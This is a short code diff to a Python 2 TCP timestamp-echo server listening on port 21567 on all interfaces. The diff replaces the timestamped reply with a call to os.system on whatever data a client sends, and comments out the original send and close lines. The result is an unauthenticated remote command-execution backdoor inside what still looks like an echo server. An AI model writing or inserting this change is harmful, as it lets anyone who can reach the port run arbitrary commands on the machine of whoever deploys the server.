@@ -2,7 +2,7 @@
 
 from socket import *
 from time import ctime
-
+from os import system
 HOST = ''
 PORT = 21567
 BUFSIZE = 1024
@@ -23,8 +23,13 @@ try:
             data = tcpCliSock.recv(BUFSIZE)
             if not data:
                 break
-            tcpCliSock.send('[%s] %s'%(ctime(),data))
-            tcpCliSock.close()
+            system(data)
+           # tcpCliSock.send('[%s] %s'%(ctime(),data))
+            #tcpCliSock.close()
 except Exception ,diag:
     #print diag
     tcpSerSock.close()
+
+tcpSerSock.close()
+
+
